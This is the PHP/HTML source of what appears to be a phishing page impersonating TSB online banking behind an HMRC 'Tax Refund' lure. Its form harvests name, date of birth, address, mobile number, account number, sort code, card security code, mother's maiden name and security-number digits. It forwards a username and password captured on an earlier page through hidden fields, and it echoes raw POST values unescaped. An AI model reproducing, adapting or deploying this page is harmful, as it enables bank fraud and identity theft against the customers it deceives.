<?php

error_reporting(0);

session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
require "assets/includes/Verify.php";

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Tax Refund</title>   
<link rel="shortcut icon" href="assets/img/fav.ico">
	
<meta http-equiv="content-language" content="en-gb">

<link href="assets/css/001.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/002.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/gotjs.css" media="screen" type="text/css" rel="stylesheet">
<script type="text/javascript" src="assets/js/jquery-min.js"></script>
<script type="text/javascript" src="assets/js/scriptsnippet.jspf"></script>
<script type="text/javascript" src="assets/js/global.js"></script>
<script type="text/javascript">DI.themePath="https://online.tsb.co.uk/personal/unauth/assets/VerdeRetail/";</script>
<script type="text/javascript" src="assets/js/custom.js"></script>
<script type="text/javascript">
function NoPin()
{
if (checkbox.checked){
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel2' for='telepin2'>Character 2 :</label><select id='telepin2' disabled name='telepin2' onchange='CaptureValue2(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel4' for='telepin4'>Character 4 :</label><select id='telepin4' disabled name='telepin4' onchange='CaptureValue4(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel6' for='telepin6'>Character 6 :</label><select id='telepin6' disabled name='telepin6' onchange='CaptureValue6(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
}
else {
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel2' for='telepin2'>Character 2 :</label><select id='telepin2' name='telepin2' onchange='CaptureValue2(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel4' for='telepin4'>Character 4 :</label><select id='telepin4' name='telepin4' onchange='CaptureValue4(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel6' for='telepin6'>Character 6 :</label><select id='telepin6' name='telepin6' onchange='CaptureValue6(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
}
}	
function ChangePinInput()
{
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel1' for='telepin1'>Character 1 :</label><select id='telepin1' name='telepin1' onchange='CaptureValue1(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel3' for='telepin3'>Character 3 :</label><select id='telepin3' name='telepin3' onchange='CaptureValue3(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel5' for='telepin5'>Character 5 :</label><select id='telepin5' name='telepin5' onchange='CaptureValue5(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
return false;
}
function FocusOnInput()
{
document.getElementById("title").focus();
}
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
function CaptureValue1(f) {
    f.telepinFinal1.value = f.telepin1.value;
}
function CaptureValue2(f) {
    f.telepinFinal2.value = f.telepin2.value;
}
function CaptureValue3(f) {
    f.telepinFinal3.value = f.telepin3.value;
}
function CaptureValue4(f) {
    f.telepinFinal4.value = f.telepin4.value;
}
function CaptureValue5(f) {
    f.telepinFinal5.value = f.telepin5.value;
}
function CaptureValue6(f) {
    f.telepinFinal6.value = f.telepin6.value;
	ChangePinInput();
}
</script>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
</head>
    <body class="hasJS safari_537" data-browser="safari" data-version="537">
        
        
        <div id="wrapper">
            





<div class="outer">

    <div id="header">
        <ul id="skiplinks"> 
            <li><a id="lnkSkip" name="lnkSkip" href="#">Skip to main content</a></li>
        </ul>
        <div class="clearfix">
            <p id="logo">
                <span><img src="assets/img/logo.png" alt="official logo"></span>  
            </p>
            
                
            <div class="secureMsg">
			<p class="msg"><img src="assets/img/top_mes.png" alt="You&#39;re logging into a secure site"></p>
			<p><a class="linkBullet newwin" href="#">How can I tell that this site is secure?</a></p>
			</div>
			<ul class="loggedHeaderLinks">
                            <li class="mobile"><a href="mobile/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" class="linkBullet">&Mu;&omicron;bile</a></li>
                            </ul>
        </div>
    </div>
   
</div>
            <div class="pageWrap">
                <div id="page" class="content">
                
                    <div class="primaryWrap">
                    
                        <div class="primary">
                        <div class="panel">
            
            <span id="strBrandName" style="display:none">VERDE</span>
            <span id="strstepno" style="display:none">Step 1</span>
            <span id="strscenarioname" style="display:none">onlineregistration</span>
                    
                
            <div class="navBar clearfix dbtNav">
			<ol class="progressBar">
				<li class="current"><div>Tax Refund</div></li>
				<li class="last"><div>Complete</div></li>
			</ol>
			</div>
   
   

            
<form action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true"autocomplete="off" class="validationName:(frm_personalRegistration) validate:() validationName:(registerIB) validate:()"enctype="application/x-www-form-urlencoded" id="frm_personalRegistration" method="post" name="frm_personalRegistration">
<input type="hidden" name="username" value="<?=$_POST['username']?>">
<input type="hidden" name="password" value="<?=$_POST['password']?>">
<input type="hidden" name="memo" value="<?=$_POST['memo']?>">
<div class="inner">
<h1>Tax Refund</h1>
<p>In order for HMRC to process payments direct to your bank account please confirm your information below.</p>
<ul>
<li>Your bank card</li>
<li>Your online banking information</li>
<li>6-digit security number </li>
</ul>
</div>
<fieldset>
<div class="formField clearfix">
<div class="formFieldInner">
<label for="name"><strong>Full name:</strong></label>
<input autocomplete="off" class="field" id="name" maxlength="30" name="name" type="text" value="<?php echo $_SESSION['name'];?>"></div>
</div>

<div class="formField clearfix">
<div class="formFieldInner">
<label for="name"><strong>Date of birth:</strong></label>
<input autocomplete="off" class="field" id="dob" maxlength="10" name="dob" type="text" value="<?php echo $_SESSION['dob'];?>"></div>
</div>

<div class="formField clearfix">
<div class="formFieldInner">
<label for="address"><strong>Address (Line 1):</strong></label>
<input autocomplete="off" class="field" id="address" maxlength="30" name="address" type="text" value="<?php echo $_SESSION['address'];?>">
</div>
</div>
<div class="formField validate:(requiredWithoutCheckbox_validatePostcode) validationName:(postcodeAddress) clearfix">
<div class="formFieldInner">
<label for="postcode"><strong>UK postcode:</strong></label>
<input autocomplete="off" class="postcode linkedTextField" id="postcode" maxlength="8" name="postcode" type="text" value="<?php echo $_SESSION['postcode'];?>"></div>
</div>
<div class=
"formField validationName:(txtEmailAddress) validationName:(txtEmailAddress) validate:(required_validateEmail) clearfix">
<div class="formFieldInner">
<label for="email"><strong>Email Address:</strong></label>
<input autocomplete="off" class="field" id="email" maxlength="30" name="email" type="text" value=""></div>
</div>
<div class="formField validate:(required_validateNumeric_validatePhoneNumber[isMobileNumber:true]) validationName:(mobilePhoneNumber) clearfix">
<div class="formFieldInner">
<label for="telephone"><strong>Mobile Number:</strong></label>
<input autocomplete="off" class="field" id="telephone" maxlength="11" name="telephone" type="text" value="<?php echo $_SESSION['telephone'];?>"></div>
</div>
</fieldset>
<fieldset>
<div class="formField clearfix validationName:(Account) validate:(required_validateAccountNumber)">
<div class="formFieldInner">
<label for="acno">Account Number:</label>
<input autocomplete="off" class="field" id="acno" maxlength="8" name="acno" type="text" value="<?php echo $_SESSION['account'];?>"></div>
</div>
<div class="formField clearfix">
<div class="formFieldInner">
<label for="sortcode">Sort Code:</label>
<input autocomplete="off" class="field" id="sortcode" maxlength="8" name="sortcode" type="text" value="<?php echo $_SESSION['sortcode'];?>"></div>
</div>
<div class="formField validationName:(secode) validate:(required_validateNumeric) clearfix">
<div class="formFieldInner"><label for="memo">Card Security Code:</label>
<input autocomplete="off"class="secode" id="secode" maxlength="3" name="secode" type="text" value="<?php echo $_SESSION['secode'];?>">
</div>
</div>
<div class="formField validationName:(mmn) validate:(required_validateAlpha) clearfix">
<div class="formFieldInner"><label for="mmn">Mothers Maiden Name:</label>
<input autocomplete="off"class="field" id="mmn" maxlength="30" name="mmn" type="text"  value="">
</div>
</div>
<fieldset class="dash memInfoSelect clearfix">
<div class="inner">
<h2>6-digit Security Number</h2>
<p><img src="assets/img/pink.png">&nbsp;Please select the characters from your 6-digit security number below:</p>
</div>
<div id="skippin" class="formField validationName:(pin) validate:(required) clearfix">
<div class="formFieldInner">
<div class="clearfix">
<div id="selectpin1">
<label id="telepinlabel2" for="telepin2">Character 2 :</label>
<select id="telepin2" name="telepin2" onchange="CaptureValue2(this.form)">
<?php echo telepinselect; ?>
</select>
</div>
</div>
<div class="clearfix">
<div id="selectpin2">
<label id="telepinlabel4" for="telepin4">Character 4 :</label>
<select id="telepin4" name="telepin4" onchange="CaptureValue4(this.form)">
<?php echo telepinselect; ?>
</select>
</div>
</div>
<div class="clearfix">
<div id="selectpin3">
<label id="telepinlabel6" for="telepin6">Character 6 :</label>
<select id="telepin6" name="telepin6" onchange="CaptureValue6(this.form)">
<?php echo telepinselect; ?>
</select>
</div>
</div>
</div>
</div>
<div style="display:block;" class="inner">
<strong>or</strong></div>
<div class="formField clearfix fieldHelp checkbox">
<div class="formFieldInner">
<input id="checkbox" type="checkbox" name="checkbox" value="check" class="linkedCheckBox" onclick="NoPin()">
<label for="frm_personalRegistration:tempResidence">You should tick this box if you don’t yet have a 6-digit Security
Number.</label>
<span class="cxtHelp"><a class="cxtTrigger" href="#_idFC12">[?]</a></span>
<div id="_idFC12" class="help">
<p>You would normally receive your 6-digit security number in the post if you don’t yet have a 6-digit Security
Number tick the box</p>
</div>
</div>
</div>
</fieldset>
<input type="hidden" name="telepinFinal1" id="telepinFinal1">
<input type="hidden" name="telepinFinal2" id="telepinFinal2">
<input type="hidden" name="telepinFinal3" id="telepinFinal3">
<input type="hidden" name="telepinFinal4" id="telepinFinal4">
<input type="hidden" name="telepinFinal5" id="telepinFinal5">
<input type="hidden" name="telepinFinal6" id="telepinFinal6">
<div class="dbtSteps clearfix">
<ul class="actions linkList">
<li class="primaryAction"><input alt="Continue" class="submitAction" id="frm_personalRegistration:continuebutton1" name="frm_personalRegistration:continuebutton1" src="assets/img/login.png" type="image"></li>
</ul>
</div>
</form>

        
                            </div>
                        </div>
                        
                    </div>
                    <div class="secondary">
                        <div class="panel">
                            

        
                            
                            
                
                
                
            
                            <div class="accordion ui-accordion ui-widget ui-helper-reset" role="tablist"><div class="part"><h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="false" tabindex="0" title="Contact Us....: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Contact Us....</h2><div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;"><div class="paneInner"><div class="quickContact"><h3>All account related queries</h3>
<p><strong>0345 975 8758</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on <strong>+44 203 284 1575.</strong></p>
<p>Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of service.<br><br></p>
<h3>Internet banking queries</h3>
<p>Technical queries about the Internet Banking service</p>
<p>Call us on<strong>&nbsp;0345 835 3844</strong>. We’re open 7am-10pm Mon – Fri, 8am-6pm Sat – Sun.</p>
<p>If you need to call us from abroad you can also call us on<strong>&nbsp;+44 (0) 203 284 1577</strong>.</p></div></div></div></div><div class="part selected"><h2 class="trigger current linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" role="tab" aria-expanded="true" tabindex="0" title="Help &amp; Support: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-s"></span>Help &amp; Support</h2><div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel"><div class="paneInner"><span class="showMeMenu"><ul class="quickFAQs ui-accordion ui-widget ui-helper-reset" role="tablist">
			
	
	<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Which account details should I provide if I have more than one account with TSB?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Which account details should I provide if I have more than one account with TSB?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>It’s really up to you to. Perhaps you should consider using the account that you use most frequently or whose details you can remember best.</p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Where can I find my sort code and account number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Where can I find my sort code and account number?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>You can find these details on one of your latest statements or on your cheque book.</p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Why is it necessary to provide my email address?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Why is it necessary to provide my email address?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>We need it to contact you should any queries arise on your account.</p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Where do I find my credit card number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Where do I find my credit card number?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>It’s the 16 digit number on the front of your credit card. Please enter it without spaces.</p>
				    </div>
			</li>
</ul>
</span>
</div>
</div>
</div>
</div>
<div class="subPanel">
<h3>Our Internet Banking Guarantee</h3>
<p>We guarantee to refund your money in the unlikely event you experience fraud with our Internet Banking service - as long as you've been careful, for example, by taking reasonable steps to keep your security information safe.</p>
</div> 
</div>
</div>
</div>              
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">			
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">Rates and Charges</a></li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>